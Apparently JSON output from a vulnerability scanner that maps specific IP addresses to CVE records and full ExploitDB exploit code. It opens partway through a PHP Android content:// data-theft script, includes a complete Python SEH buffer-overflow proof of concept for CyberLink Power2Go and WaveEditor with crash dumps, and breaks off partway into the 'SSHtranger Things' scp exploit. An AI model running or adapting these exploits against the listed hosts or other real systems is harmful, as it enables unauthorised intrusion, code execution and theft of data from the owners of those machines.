or die(\"Couldn't write data to file!\"); \r\n  fclose($fp); \r\n  echo \"Data uploaded to <a href=\\\"files.txt\\\">files.txt</a>!\";\r\n}\r\n\r\n//  Select the stage to run depending on the parameter passed in the URL\r\nswitch($_GET[\"stage\"]) { \r\n  case \"1\": \r\n    stage1($scripturl); \r\n    break; \r\n  case \"2\": \r\n    stage2($scripturl,$filenames); \r\n    break; \r\n  case \"3\": \r\n    stage3(); \r\n    break;\r\n  default: \r\n    stage0($scripturl); \r\n    break; \r\n} \r\n?>",
                "description": "Google Android - 'content://' URI Multiple Information Disclosure Vulnerabilities",
                "author": "Thomas Cannon",
                "_id": 18164,
                "source": "ExploitDB",
                "platform": "android",
                "date": "2011-11-28T00:00:00+00:00",
                "cve": [
                    "CVE-2010-4804"
                ],
                "type": "webapps",
                "port": 0
            },
            {
                "code": "#!/usr/bin/python\r\n# \r\n# Exploit Title: CyberLink Multiple Products File Project Handling Stack Buffer Overflow POC\r\n# by: modpr0be[at]spentera[dot]com (@modpr0be)\r\n# Platform: Windows\r\n# Tested on: Windows XP SP3, Windows 7 SP1 with:\r\n# \tCyberLink Power2Go 7 (build 196)\r\n# \tCyberLink Power2Go 8 (build 1031)\r\n# \tCyberLink WaveEditor 2.0 (build 2204)\r\n# Software Link: http://www.cyberlink.com/downloads/trials/index_en_US.html\r\n# CVE : -\r\n\r\n### Software Description\r\n# CyberLink Power2Go is all-media disc burning software. \r\n# Copy all your media to any disc with Power2Go 8! With new System Recovery tools \r\n# and over 5000 free DVD menus to choose from on DirectorZone.com, Power2Go 8 not \r\n# only burns everything but allows you to create pro-like DVDs, rip CDs and \r\n# safeguard valuable data. \r\n\r\n# CyberLink Wave Editor will help user to convert audio format when producing, editing, \r\n# or creating backups for some audios or videos. This additional tools is also included \r\n# since PowerDirector 9 to PowerDirector 10, and now included on Power2Go 8.\r\n\r\n### Vulnerability Details\r\n# Most of CyberLink products contain built-in project file with their own format and\r\n# extension. This file usually contains our recently modified project or work.\r\n# Most of this filetypes contain this section:\r\n#     <File src=\r\n#     <File name=\r\n# Generally, those sections will be filled with source path or filename. \r\n# both products will lead us to command execution because the address of \r\n# SE Handler is overwritten with 0x00410041.\r\n\r\n# Notes:\r\n# I cannot find any good return address for WaveEditor, if you can make it\r\n# through the hard way, kudos!!\r\n\r\n### Vendor logs:\r\n# 10/10/2011 - Bug found\r\n# 10/11/2011 - Vendor contacted\r\n# 10/11/2011 - Vendor replied and requested POC\r\n# 10/11/2011 - POC sent to vendor\r\n# 10/31/2011 - Vendor said the POC will be researched\r\n# 10/27/2011 - Submitted to CERT\r\n# 11/09/2011 - CyberLink updated the product\r\n# 11/09/2011 - POC still works on the latest version\r\n# 12/09/2011 - No response from vendor, POC release.\r\n\r\nimport time,sys\r\n\r\ndef power2go():\r\n\t# header for power2go\r\n\theader = (\r\n\t\"\\x3c\\x50\\x72\\x6f\\x6a\\x65\\x63\\x74\\x20\\x6d\\x61\\x67\\x69\\x63\"\r\n\t\"\\x3d\\x22\\x69\\x6e\\x73\\x65\\x63\\x75\\x72\\x69\\x74\\x79\\x22\\x20\"\r\n\t\"\\x76\\x65\\x72\\x73\\x69\\x6f\\x6e\\x3d\\x22\\x31\\x30\\x31\\x22\\x3e\"\r\n\t\"\\x0d\\x0a\\x3c\\x49\\x6e\\x66\\x6f\\x72\\x6d\\x61\\x74\\x69\\x6f\\x6e\"\r\n\t\"\\x2f\\x3e\\x0d\\x0a\\x3c\\x43\\x6f\\x6d\\x70\\x69\\x6c\\x61\\x74\\x69\"\r\n\t\"\\x6f\\x6e\\x3e\\x0d\\x0a\\x3c\\x44\\x61\\x74\\x61\\x44\\x69\\x73\\x63\"\r\n\t\"\\x20\\x0d\\x0a\\x64\\x69\\x73\\x63\\x4e\\x61\\x6d\\x65\\x3d\\x22\\x49\"\r\n\t\"\\x4e\\x53\\x45\\x43\\x55\\x52\\x49\\x54\\x59\\x22\\x20\\x0d\\x0a\\x66\"\r\n\t\"\\x69\\x6c\\x65\\x44\\x61\\x74\\x65\\x3d\\x22\\x6f\\x72\\x69\\x67\\x69\"\r\n\t\"\\x6e\\x61\\x6c\\x22\\x20\\x66\\x69\\x6c\\x65\\x54\\x69\\x6d\\x65\\x3d\"\r\n\t\"\\x22\\x30\\x22\\x20\\x0d\\x0a\\x64\\x69\\x73\\x63\\x54\\x79\\x70\\x65\"\r\n\t\"\\x3d\\x22\\x63\\x64\\x22\\x20\\x0d\\x0a\\x73\\x65\\x73\\x73\\x69\\x6f\"\r\n\t\"\\x6e\\x53\\x69\\x7a\\x65\\x3d\\x22\\x30\\x22\\x20\\x0d\\x0a\\x50\\x4f\"\r\n\t\"\\x57\\x42\\x75\\x72\\x6e\\x65\\x64\\x53\\x69\\x7a\\x65\\x3d\\x22\\x30\"\r\n\t\"\\x22\\x20\\x0d\\x0a\\x53\\x65\\x63\\x75\\x72\\x65\\x64\\x44\\x61\\x74\"\r\n\t\"\\x61\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x57\\x68\"\r\n\t\"\\x6f\\x6c\\x65\\x53\\x65\\x63\\x75\\x72\\x65\\x64\\x44\\x61\\x74\\x61\"\r\n\t\"\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x53\\x65\\x63\"\r\n\t\"\\x75\\x72\\x69\\x74\\x79\\x4b\\x65\\x79\\x53\\x69\\x7a\\x65\\x3d\\x22\"\r\n\t\"\\x31\\x36\\x22\\x20\\x0d\\x0a\\x48\\x69\\x64\\x65\\x46\\x69\\x6c\\x65\"\r\n\t\"\\x4e\\x61\\x6d\\x65\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\"\r\n\t\"\\x0a\\x62\\x6f\\x6f\\x74\\x61\\x62\\x6c\\x65\\x3d\\x22\\x66\\x61\\x6c\"\r\n\t\"\\x73\\x65\\x22\\x20\\x0d\\x0a\\x62\\x6f\\x6f\\x74\\x46\\x6c\\x6f\\x70\"\r\n\t\"\\x70\\x79\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x62\"\r\n\t\"\\x6f\\x6f\\x74\\x49\\x6d\\x61\\x67\\x65\\x3d\\x22\\x22\\x20\\x0d\\x0a\"\r\n\t\"\\x61\\x75\\x74\\x6f\\x52\\x75\\x6e\\x45\\x78\\x65\\x3d\\x22\\x66\\x61\"\r\n\t\"\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x61\\x75\\x74\\x6f\\x52\\x75\\x6e\"\r\n\t\"\\x45\\x78\\x65\\x50\\x61\\x74\\x68\\x3d\\x22\\x22\\x20\\x0d\\x0a\\x61\"\r\n\t\"\\x75\\x74\\x6f\\x52\\x75\\x6e\\x49\\x63\\x6f\\x6e\\x3d\\x22\\x66\\x61\"\r\n\t\"\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x61\\x75\\x74\\x6f\\x52\\x75\\x6e\"\r\n\t\"\\x49\\x63\\x6f\\x6e\\x50\\x61\\x74\\x68\\x3d\\x22\\x22\\x20\\x0d\\x0a\"\r\n\t\"\\x41\\x75\\x74\\x6f\\x53\\x70\\x6c\\x69\\x74\\x44\\x69\\x73\\x63\\x3d\"\r\n\t\"\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x44\\x69\\x73\\x63\"\r\n\t\"\\x53\\x70\\x6c\\x69\\x74\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\"\r\n\t\"\\x0d\\x0a\\x41\\x75\\x74\\x6f\\x4f\\x76\\x65\\x72\\x42\\x75\\x72\\x6e\"\r\n\t\"\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x44\\x61\\x74\"\r\n\t\"\\x61\\x50\\x72\\x6a\\x74\\x6f\\x56\\x69\\x64\\x65\\x6f\\x50\\x72\\x6a\"\r\n\t\"\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x73\\x69\\x6d\"\r\n\t\"\\x75\\x6c\\x61\\x74\\x69\\x6f\\x6e\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\"\r\n\t\"\\x22\\x20\\x0d\\x0a\\x62\\x75\\x72\\x6e\\x50\\x72\\x6f\\x6f\\x66\\x3d\"\r\n\t\"\\x22\\x74\\x72\\x75\\x65\\x22\\x20\\x0d\\x0a\\x63\\x6c\\x6f\\x73\\x65\"\r\n\t\"\\x44\\x69\\x73\\x63\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\"\r\n\t\"\\x0a\\x76\\x65\\x72\\x69\\x66\\x79\\x44\\x69\\x73\\x63\\x3d\\x22\\x66\"\r\n\t\"\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x64\\x65\\x66\\x65\\x63\\x74\"\r\n\t\"\\x6d\\x61\\x6e\\x61\\x67\\x65\\x6d\\x65\\x6e\\x74\\x3d\\x22\\x66\\x61\"\r\n\t\"\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x63\\x6f\\x70\\x69\\x65\\x73\\x3d\"\r\n\t\"\\x22\\x31\\x22\\x20\\x0d\\x0a\\x62\\x75\\x72\\x6e\\x53\\x70\\x65\\x65\"\r\n\t\"\\x64\\x3d\\x22\\x30\\x22\\x20\\x0d\\x0a\\x63\\x64\\x54\\x65\\x78\\x74\"\r\n\t\"\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x41\\x75\\x64\"\r\n\t\"\\x69\\x6f\\x4e\\x6f\\x72\\x6d\\x61\\x6c\\x69\\x7a\\x65\\x3d\\x22\\x66\"\r\n\t\"\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x41\\x75\\x64\\x69\\x6f\\x47\"\r\n\t\"\\x61\\x70\\x54\\x69\\x6d\\x65\\x3d\\x22\\x32\\x22\\x20\\x0d\\x0a\\x46\"\r\n\t\"\\x69\\x6c\\x65\\x53\\x79\\x73\\x74\\x65\\x6d\\x3d\\x22\\x49\\x53\\x4f\"\r\n\t\"\\x39\\x36\\x36\\x30\\x5f\\x4a\\x4f\\x4c\\x49\\x45\\x54\\x22\\x3e\")\r\n\r\n\tbody = (\r\n\t\"\\x73\\x72\\x63\\x3d\\x22\\x43\\x3a\\x5c\\x61\\x62\\x63\\x2e\\x74\\x78\"\r\n\t\"\\x74\\x22\\x20\\x0d\\x0a\\x6f\\x70\\x65\\x72\\x61\\x74\\x69\\x6f\\x6e\"\r\n\t\"\\x3d\\x22\\x61\\x64\\x64\\x22\\x20\\x0d\\x0a\\x62\\x75\\x72\\x6e\\x73\"\r\n\t\"\\x74\\x61\\x74\\x75\\x73\\x3d\\x22\\x6e\\x6f\\x74\\x62\\x75\\x72\\x6e\"\r\n\t\"\\x22\\x20\\x0d\\x0a\\x73\\x69\\x7a\\x65\\x3d\\x22\\x32\\x39\\x32\\x38\"\r\n\t\"\\x36\\x34\\x22\\x20\\x0d\\x0a\\x53\\x68\\x6f\\x77\\x53\\x69\\x7a\\x65\"\r\n\t\"\\x3d\\x22\\x32\\x39\\x32\\x38\\x36\\x34\\x22\\x20\\x0d\\x0a\\x41\\x6c\"\r\n\t\"\\x6c\\x6f\\x77\\x45\\x6e\\x63\\x72\\x79\\x70\\x74\\x3d\\x22\\x66\\x61\"\r\n\t\"\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x53\\x65\\x63\\x75\\x72\\x65\\x64\"\r\n\t\"\\x52\\x6f\\x6f\\x74\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\"\r\n\t\"\\x0a\\x66\\x69\\x6c\\x65\\x54\\x69\\x6d\\x65\\x3d\\x22\\x31\\x32\\x39\"\r\n\t\"\\x33\\x36\\x37\\x33\\x34\\x31\\x35\\x30\\x39\\x37\\x33\\x36\\x38\\x37\"\r\n\t\"\\x34\\x22\\x20\\x0d\\x0a\\x6f\\x6c\\x64\\x3d\\x22\\x66\\x61\\x6c\\x73\"\r\n\t\"\\x65\\x22\\x20\\x0d\\x0a\\x74\\x65\\x6d\\x70\\x66\\x69\\x6c\\x65\\x3d\"\r\n\t\"\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x74\\x65\\x6d\\x70\"\r\n\t\"\\x64\\x69\\x72\\x6c\\x65\\x76\\x65\\x6c\\x3d\\x22\\x30\\x22\\x20\\x0d\"\r\n\t\"\\x0a\\x66\\x6f\\x72\\x61\\x75\\x64\\x69\\x6f\\x74\\x72\\x61\\x63\\x6b\"\r\n\t\"\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x74\\x61\\x72\"\r\n\t\"\\x67\\x65\\x74\\x41\\x75\\x64\\x69\\x6f\\x43\\x44\\x3d\\x22\\x66\\x61\"\r\n\t\"\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x64\\x61\\x74\\x61\\x69\\x74\\x65\"\r\n\t\"\\x6d\\x74\\x79\\x70\\x65\\x3d\\x22\\x30\\x22\\x20\\x0d\\x0a\\x6d\\x76\"\r\n\t\"\\x70\\x3d\\x22\\x30\\x22\\x20\\x0d\\x0a\\x61\\x75\\x64\\x69\\x6f\\x53\"\r\n\t\"\\x75\\x62\\x74\\x79\\x70\\x65\\x3d\\x22\\x30\\x22\\x2f\\x3e\\x0d\\x0a\"\r\n\t\"\\x3c\\x2f\\x44\\x61\\x74\\x61\\x44\\x69\\x73\\x63\\x3e\\x0d\\x0a\\x3c\"\r\n\t\"\\x2f\\x43\\x6f\\x6d\\x70\\x69\\x6c\\x61\\x74\\x69\\x6f\\x6e\\x3e\\x0d\"\r\n\t\"\\x0a\\x3c\\x2f\\x50\\x72\\x6f\\x6a\\x65\\x63\\x74\\x3e\")\r\n\r\n\tpgfile = \"overflow.p2g\"\r\n\tf = open(pgfile,'w')\r\n\tjunk = \"A\" * 778\r\n\tnseh = \"\\x42\\x42\"\r\n\tseh = \"\\x43\\x43\"\r\n\tsisa =  \"\\x44\" * 4200\r\n\r\n\thell = \"\\x3c\\x46\\x69\\x6c\\x65\" + \"\\r\\n\"\t# <File\r\n\thell+= \"name=\" + '\"'+ junk+nseh+seh+sisa + '\"'\r\n\ttry:\r\n\t\tf.write(header+ \"\\r\\n\" + hell + \"\\r\\n\" + body)\r\n\t\tprint \"[!] Generating\", pgfile, \"..\"\r\n\t\ttime.sleep(1)\r\n\t\tprint \"[+] File\", pgfile, \"successfully created!\"\r\n\t\tprint \"[*] Now open project file\" +\" \\'\"+pgfile+\"\\' \" + \"with CyberLink Power2Go.\"\r\n\t\tprint \"[*] Good luck ;)\"\r\n\t\tf.close()\r\n\texcept IOError:\r\n\t\tprint \"[-] Could not write to destination folder, check permission..\"\r\n\t\tsys.exit()\r\n\r\ndef waveeditor():\r\n\theader = (\"\\x3c\\x50\\x72\\x6f\\x6a\\x65\\x63\\x74\\x20\\x41\\x70\\x70\\x6c\\x69\\x63\\x61\"\r\n\t\"\\x74\\x69\\x6f\\x6e\\x3d\\x22\\x57\\x61\\x76\\x65\\x45\\x64\\x69\\x74\\x6f\\x72\\x22\\x20\"\r\n\t\"\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x3d\\x22\\x32\\x2e\\x30\\x22\\x3e\")\r\n\r\n\twvefile = \"overflow.wve\"\r\n\tf = open(wvefile,'w')\r\n\tjunk = \"A\" * 3000\r\n\r\n\thell = \"\\x3c\\x46\\x69\\x6c\\x65\\x20\\x53\\x72\\x63\\x3d\" # <File src=\r\n\thell += '\"'+ junk + '\"' + \"\\x3e\"\r\n\r\n\tfill = (\"\\x3c\\x42\\x6f\\x6f\\x6b\\x6d\\x61\\x72\\x6b\\x4c\\x69\\x73\\x74\\x2f\\x3e\\x3c\"\r\n\t\"\\x2f\\x46\\x69\\x6c\\x65\\x3e\\x3c\\x2f\\x50\\x72\\x6f\\x6a\\x65\\x63\\x74\\x3e\")\r\n\t\r\n\tfill = (\"\\x3c\\x42\\x6f\\x6f\\x6b\\x6d\\x61\\x72\\x6b\\x4c\\x69\\x73\\x74\\x2f\\x3e\\x3c\"\r\n\t\"\\x2f\\x46\\x69\\x6c\\x65\\x3e\\x3c\\x43\\x6f\\x6d\\x70\\x69\\x6c\\x61\\x74\\x69\\x6f\\x6e\"\r\n\t\"\\x3e\\x3c\\x41\\x75\\x64\\x69\\x6f\\x43\\x44\\x20\\x62\\x75\\x72\\x6e\\x50\\x72\\x6f\\x6f\"\r\n\t\"\\x66\\x3d\\x22\\x74\\x72\\x75\\x65\\x22\\x20\\x63\\x6f\\x70\\x69\\x65\\x73\\x3d\\x22\\x30\"\r\n\t\"\\x22\\x20\\x62\\x75\\x72\\x6e\\x53\\x70\\x65\\x65\\x64\\x3d\\x22\\x30\\x22\\x20\\x41\\x75\"\r\n\t\"\\x64\\x69\\x6f\\x4e\\x6f\\x72\\x6d\\x61\\x6c\\x69\\x7a\\x65\\x3d\\x22\\x66\\x61\\x6c\\x73\"\r\n\t\"\\x65\\x22\\x20\\x41\\x75\\x64\\x69\\x6f\\x47\\x61\\x70\\x54\\x69\\x6d\\x65\\x3d\\x22\\x32\"\r\n\t\"\\x22\\x2f\\x3e\\x3c\\x2f\\x43\\x6f\\x6d\\x70\\x69\\x6c\\x61\\x74\\x69\\x6f\\x6e\\x3e\\x3c\"\r\n\t\"\\x2f\\x50\\x72\\x6f\\x6a\\x65\\x63\\x74\\x3e\")\r\n\t\r\n\ttry:\r\n\t\tf.write(header+hell+fill)\r\n\t\tprint \"[!] Generating\", wvefile, \"..\"\r\n\t\ttime.sleep(1)\r\n\t\tprint \"[+] File\", wvefile, \"successfully created!\"\r\n\t\tprint \"[*] Now open project file\" +\" \\'\"+wvefile+\"\\' \" + \"with CyberLink WaveEditor.\"\r\n\t\tprint \"[*] Good luck ;)\"\r\n\t\tf.close()\r\n\texcept IOError:\r\n\t\tprint \"[-] Could not write to destination folder, check permission..\"\r\n\t\tsys.exit()\r\n\r\nprint \"[*] CyberLink Multiple Products File Project Processing Stack Buffer Overflow POC.\"\r\nprint \"[*] by modpr0be <modpr0be[at]spentera[dot]com> | @modpr0be\"\r\nprint \"\\t1.CyberLink Power2Go <= 8.0\"\r\nprint \"\\t2.CyberLink WaveEditor <= 2.0\"\r\n\r\na = 0\r\nwhile a < 2:\r\n\ta = a + 1\r\n\top = input (\"[!] Choose the product: \")\r\n\tif op == 1:\r\n\t\tpower2go()\r\n\t\tsys.exit()\r\n\telif op == 2:\r\n\t\twaveeditor()\r\n\t\tsys.exit()\r\n\telse:\r\n\t\tprint \"[-] Oh plz.. pick the right one :)\\r\\n\"\r\n\r\n\r\n### DUMP OF POWER2GO\r\n#(d18.c60): Break instruction exception - code 80000003 (first chance)\r\n#eax=7ffde000 ebx=00000001 ecx=00000002 edx=00000003 esi=00000004 edi=00000005\r\n#eip=7c90120e esp=07d4ffcc ebp=07d4fff4 iopl=0         nv up ei pl zr na pe nc\r\n#cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00000246\r\n#ntdll!DbgBreakPoint:\r\n#7c90120e cc              int     3\r\n#Missing image name, possible paged-out or corrupt data.\r\n#Missing image name, possible paged-out or corrupt data.\r\n#0:022> g\r\n#(d18.d40): Access violation - code c0000005 (first chance)\r\n#First chance exceptions are reported before any exception handling.\r\n#This exception may be expected and handled.\r\n#eax=ec8b55ff ebx=010358b0 ecx=78ad8951 edx=005b12fc esi=00430043 edi=0012d69c\r\n#eip=ec8b55ff esp=0012ca70 ebp=00000000 iopl=0         nv up ei pl zr na pe nc\r\n#cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\r\n#ec8b55ff ??              ???\r\n#*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\Program Files\\CyberLink\\Power2Go8\\Power2Go8.exe - \r\n#0:000> !exchain\r\n#0012ca9c: Power2Go8!CCLAuMixerAPI::operator=+156ba8 (00560dc8)\r\n#0012d104: Power2Go8!CCLAuMixerAPI::operator=+25e23 (00430043)\r\n#Invalid exception stack at 00420042\r\n#0:000> d 0012d104\r\n#0012d104  42 00 42 00 43 00 43 00-43 00 43 00 43 00 43 00  B.B.C.C.C.C.C.C.\r\n#0012d114  43 00 43 00 43 00 43 00-43 00 43 00 43 00 43 00  C.C.C.C.C.C.C.C.\r\n#0012d124  43 00 43 00 43 00 43 00-43 00 43 00 43 00 43 00  C.C.C.C.C.C.C.C.\r\n#0012d134  43 00 43 00 43 00 43 00-43 00 43 00 43 00 43 00  C.C.C.C.C.C.C.C.\r\n#0012d144  43 00 43 00 43 00 43 00-43 00 43 00 43 00 43 00  C.C.C.C.C.C.C.C.\r\n#0012d154  43 00 43 00 43 00 43 00-43 00 43 00 43 00 43 00  C.C.C.C.C.C.C.C.\r\n#0012d164  43 00 43 00 43 00 43 00-43 00 43 00 43 00 43 00  C.C.C.C.C.C.C.C.\r\n#0012d174  43 00 43 00 43 00 43 00-43 00 43 00 43 00 43 00  C.C.C.C.C.C.C.C.\r\n\r\n\r\n### DUMP OF WAVE EDITOR\r\n#(e44.734): Break instruction exception - code 80000003 (first chance)\r\n#eax=7ffd9000 ebx=00000001 ecx=00000002 edx=00000003 esi=00000004 edi=00000005\r\n#eip=7c90120e esp=00e5ffcc ebp=00e5fff4 iopl=0         nv up ei pl zr na pe nc\r\n#cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00000246\r\n#ntdll!DbgBreakPoint:\r\n#7c90120e cc              int     3\r\n#Missing image name, possible paged-out or corrupt data.\r\n#Missing image name, possible paged-out or corrupt data.\r\n#0:016> g\r\n#(e44.e48): Access violation - code c0000005 (first chance)\r\n#First chance exceptions are reported before any exception handling.\r\n#This exception may be expected and handled.\r\n#eax=00410041 ebx=ffffffff ecx=0240868b edx=420b1802 esi=022ccbe8 edi=00d2f848\r\n#eip=024c47af esp=0012c424 ebp=0012c42c iopl=0         nv up ei pl nz na pe nc\r\n#cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210206\r\n#*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\Program Files\\CyberLink\\WaveEditor\\WaveKernel.dll -\r\n#WaveKernel!ReleaseWaveKernelClient+0x12a8f:\r\n#024c47af 8b4208          mov     eax,dword ptr [edx+8] ds:0023:420b180a=????????\r\n#Missing image name, possible paged-out or corrupt data.\r\n#Missing image name, possible paged-out or corrupt data.\r\n#0:000> !exchain\r\n#0012c898: *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\Program Files\\CyberLink\\WaveEditor\\WaveEditor.exe -\r\n#WaveEditor!CCLAuMixerAPI::CCLAuMixerAPI+da61 (00410041)\r\n#Invalid exception stack at 00410041\r\n#0:000> d 0012c898\r\n#0012c898  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\r\n#0012c8a8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\r\n#0012c8b8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\r\n#0012c8c8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\r\n#0012c8d8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\r\n#0012c8e8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\r\n#0012c8f8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\r\n#0012c908  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\r\n#",
                "description": "CyberLink (Multiple Products) - File Project Handling Stack Buffer Overflow (PoC)",
                "author": "modpr0be",
                "_id": 18220,
                "source": "ExploitDB",
                "platform": "windows",
                "date": "2011-12-09T00:00:00+00:00",
                "cve": [],
                "type": "dos",
                "port": 0
            }
        ]
    },
    "152.1.52.59": {
        "CVE-2018-15919": [
            {
                "source": "CVE",
                "_id": "2018-15919",
                "description": "Remotely observable behaviour in auth-gss2.c in OpenSSH through 7.8 could be used by remote attackers to detect existence of users on a target system when GSS2 is in use. NOTE: the discoverer states 'We understand that the OpenSSH developers do not want to treat such a username enumeration (or \"oracle\") as a vulnerability.'",
                "osvdb": [],
                "bid": [
                    105163
                ],
                "cve": [
                    "CVE-2018-15919"
                ],
                "msb": []
            }
        ],
        "CVE-2017-15906": [
            {
                "source": "CVE",
                "_id": "2017-15906",
                "description": "The process_open function in sftp-server.c in OpenSSH before 7.6 does not properly prevent write operations in readonly mode, which allows attackers to create zero-length files.",
                "osvdb": [],
                "bid": [
                    101552
                ],
                "cve": [
                    "CVE-2017-15906"
                ],
                "msb": []
            }
        ]
    },
    "152.1.52.64": {
        "CVE-2018-15919": [
            {
                "source": "CVE",
                "_id": "2018-15919",
                "description": "Remotely observable behaviour in auth-gss2.c in OpenSSH through 7.8 could be used by remote attackers to detect existence of users on a target system when GSS2 is in use. NOTE: the discoverer states 'We understand that the OpenSSH developers do not want to treat such a username enumeration (or \"oracle\") as a vulnerability.'",
                "osvdb": [],
                "bid": [
                    105163
                ],
                "cve": [
                    "CVE-2018-15919"
                ],
                "msb": []
            }
        ],
        "CVE-2017-15906": [
            {
                "source": "CVE",
                "_id": "2017-15906",
                "description": "The process_open function in sftp-server.c in OpenSSH before 7.6 does not properly prevent write operations in readonly mode, which allows attackers to create zero-length files.",
                "osvdb": [],
                "bid": [
                    101552
                ],
                "cve": [
                    "CVE-2017-15906"
                ],
                "msb": []
            }
        ]
    },
    "152.1.52.69": {
        "CVE-2018-15919": [
            {
                "source": "CVE",
                "_id": "2018-15919",
                "description": "Remotely observable behaviour in auth-gss2.c in OpenSSH through 7.8 could be used by remote attackers to detect existence of users on a target system when GSS2 is in use. NOTE: the discoverer states 'We understand that the OpenSSH developers do not want to treat such a username enumeration (or \"oracle\") as a vulnerability.'",
                "osvdb": [],
                "bid": [
                    105163
                ],
                "cve": [
                    "CVE-2018-15919"
                ],
                "msb": []
            }
        ],
        "CVE-2017-15906": [
            {
                "source": "CVE",
                "_id": "2017-15906",
                "description": "The process_open function in sftp-server.c in OpenSSH before 7.6 does not properly prevent write operations in readonly mode, which allows attackers to create zero-length files.",
                "osvdb": [],
                "bid": [
                    101552
                ],
                "cve": [
                    "CVE-2017-15906"
                ],
                "msb": []
            }
        ]
    },
    "152.1.52.89": {
        "CVE-2019-6111": [
            {
                "source": "CVE",
                "_id": "2019-7283",
                "description": "An issue was discovered in rcp in NetKit through 0.17. For an rcp operation, the server chooses which files/directories are sent to the client. However, the rcp client only performs cursory validation of the object name returned. A malicious rsh server (or Man-in-The-Middle attacker) can overwrite arbitrary files in a directory on the rcp client machine. This is similar to CVE-2019-6111.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2019-7283"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2019-6111",
                "description": "An issue was discovered in OpenSSH 7.9. Due to the scp implementation being derived from 1983 rcp, the server chooses which files/directories are sent to the client. However, the scp client only performs cursory validation of the object name returned (only directory traversal attacks are prevented). A malicious scp server (or Man-in-The-Middle attacker) can overwrite arbitrary files in the scp client target directory. If recursive operation (-r) is performed, the server can manipulate subdirectories as well (for example, to overwrite the .ssh/authorized_keys file).",
                "osvdb": [],
                "bid": [
                    106741
                ],
                "cve": [
                    "CVE-2019-6111"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2019-25017",
                "description": "An issue was discovered in rcp in MIT krb5-appl through 1.0.3. Due to the rcp implementation being derived from 1983 rcp, the server chooses which files/directories are sent to the client. However, the rcp client only performs cursory validation of the object name returned (only directory traversal attacks are prevented). A malicious rcp server (or Man-in-The-Middle attacker) can overwrite arbitrary files in the rcp client target directory. If recursive operation (-r) is performed, the server can manipulate subdirectories as well (for example, to overwrite the .ssh/authorized_keys file). This issue is similar to CVE-2019-6111 and CVE-2019-7283. NOTE: MIT krb5-appl is not supported upstream but is shipped by a few Linux distributions. The affected code was removed from the supported MIT Kerberos 5 (aka krb5) product many years ago, at version 1.8.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2019-25017"
                ],
                "msb": []
            },
            {
                "code": "# Exploit Title: SSHtranger Things\r\n# Date: 2019-01-17\r\n# Exploit Author: Mark E. Haase <mhaase@hyperiongray.com>\r\n# Vendor Homepage: https://www.openssh.com/\r\n# Software Link: [download link if available]\r\n# Version: OpenSSH 7.6p1\r\n# Tested on: Ubuntu 18.04.1 LTS\r\n# CVE : CVE-2019-6111, CVE-2019-6110\r\n\r\n'''\r\nTitle:     SSHtranger Things\r\nAuthor:    Mark E. Haase <mhaase@hyperiongray.com>\r\nHomepage:  https://www.hyperiongray.com\r\nDate:      2019-01-17\r\nCVE:       CVE-2019-6111, CVE-2019-6110\r\nAdvisory:  https://sintonen.fi/advisories/scp-client-multiple-vulnerabilities.txt\r\nTested on: Ubuntu 18.04.1 LTS, OpenSSH client 7.6p1\r\n\r\nWe have nicknamed this \"SSHtranger Things\" because the bug is so old it could be\r\nexploited by an 8-bit Demogorgon. Tested on Python 3.6.7 and requires `paramiko`\r\npackage.\r\n\r\nThe server listens on port 2222. It accepts any username and password, and it\r\ngenerates a new host key every time you run it.\r\n\r\n    $ python3 sshtranger_things.py\r\n\r\nDownload a file using a vulnerable client. The local path must be a dot:\r\n\r\n    $ scp -P 2222 foo@localhost:test.txt .\r\n    The 